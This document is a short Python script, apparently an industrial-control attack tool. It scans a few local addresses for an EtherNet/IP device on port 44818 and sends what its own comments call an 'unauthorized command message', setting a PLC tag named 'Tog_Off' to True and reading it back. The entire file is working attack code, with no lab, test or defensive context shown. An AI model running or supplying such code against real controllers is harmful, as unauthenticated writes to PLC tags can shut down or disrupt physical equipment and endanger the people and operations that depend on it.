from cpppo.server.enip import client
import socket
import time

# Define the IP address of the PLC
plc_ip = None

# Function to find the PLC's IP address if it's not known
def find_plc_ip():
    # This could involve scanning the network or using a discovery protocol
    # For simplicity, let's assume you have a list of potential IPs
    potential_ips = ['192.168.1.1', '192.168.1.2']
    for ip in potential_ips:
        # Send a discovery packet and check for a response
        # This step is highly dependent on the specific protocol and device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
            if result == 0:
                return ip
            sock.close()
        except socket.error:
            pass
    return None

# Function to send an unauthorized command message
def send_unauthorized_command(tag, value):
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Write to the specified tag
            conn.write([tag], [value])
            
            print(f"Unauthorized command message sent to {tag} with value {value}")
    else:
        print("PLC IP address not found")

# Main function to start the unauthorized command message process
def main():
    global plc_ip
    plc_ip = find_plc_ip()
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Send an unauthorized command message to the 'Tog_Off' tag
        send_unauthorized_command('Tog_Off', True)
        
        # Wait for 5 seconds to allow the command to take effect
        time.sleep(5)
        
        # Read the current value of the 'Tog_Off' tag
        with client.connector(host=plc_ip) as conn:
            tog_off_value = conn.read(['Tog_Off'])
            print("Tog_Off value:", tog_off_value)
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()